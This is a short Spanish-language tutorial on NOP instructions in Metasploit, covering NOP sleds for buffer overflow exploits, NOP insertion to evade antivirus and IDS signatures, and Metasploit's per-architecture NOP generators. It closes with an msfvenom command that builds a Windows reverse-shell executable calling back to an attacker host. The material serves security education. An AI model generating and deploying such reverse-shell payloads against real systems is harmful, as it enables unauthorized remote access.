# Metasploit - NOPs

**NOP** significa _No Operation_. En lenguaje ensamblador (assembly), es una instrucción que **no realiza ninguna acción** cuando es ejecutada por el procesador.

En Intel x86, por ejemplo, el byte `0x90` representa una instrucción NOP. Cuando el procesador lo encuentra, simplemente pasa a la siguiente instrucción.

## ¿Para qué se usan los NOPs en explotación?

En el desarrollo de **exploits y shellcodes**, los NOPs se utilizan principalmente por dos motivos:

### 1. **NOP Sled (tobogán de NOPs)**

- Se insertan múltiples instrucciones NOP antes del payload.
    
- Esto **amplía la zona de impacto** para que, si la dirección de salto (EIP, RIP, etc.) no es exacta, aún caiga en la zona del NOP sled y se desplace suavemente hacia el payload real.
    
- Es una técnica clásica usada para **aumentar la confiabilidad** de exploits, especialmente en desbordamientos de búfer.
    

### 2. **Evasión de firmas**

- Algunos sistemas de detección analizan firmas binarias.
    
- Insertar NOPs en el shellcode o payload puede alterar la firma del código lo suficiente como para evitar la detección por un antivirus o IDS, sin modificar su funcionalidad.


## ¿Qué ofrece Metasploit en cuanto a NOPs?

Metasploit incluye **generadores de NOPs específicos para diversas plataformas y arquitecturas**, lo que permite construir payloads más robustos y compatibles con diferentes sistemas.

### Categorías de NOPs en la tabla:

|Categoría|Descripción|
|---|---|
|**aarch64**|Arquitectura ARM de 64 bits (común en dispositivos móviles modernos).|
|**aarmle**|ARM Little Endian, típica en IoT y dispositivos embebidos.|
|**mipsbe**|MIPS Big Endian.|
|**php**|Payloads para entornos PHP, donde el NOP se adapta a ejecución web.|
|**ppc**|PowerPC, usado en routers, servidores antiguos y consolas.|
|**sparc**|Arquitectura SPARC de Sun Microsystems.|
|**tty**|NOPs diseñados para terminales (en algunos casos específicos).|
|**x64**|NOPs para arquitecturas de 64 bits (como AMD64, Intel64).|
|**x86**|NOPs tradicionales para arquitecturas de 32 bits (Intel).|

## Ejemplo de uso en `msfvenom`

Al generar payloads, puedes especificar la cantidad de bytes NOP que deseas añadir:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -n 16 -f exe > nop_shell.exe
```

- `-n 16`: Inserta 16 bytes de NOP antes del payload.
    
- Esto mejora la confiabilidad si la dirección de salto es imprecisa.
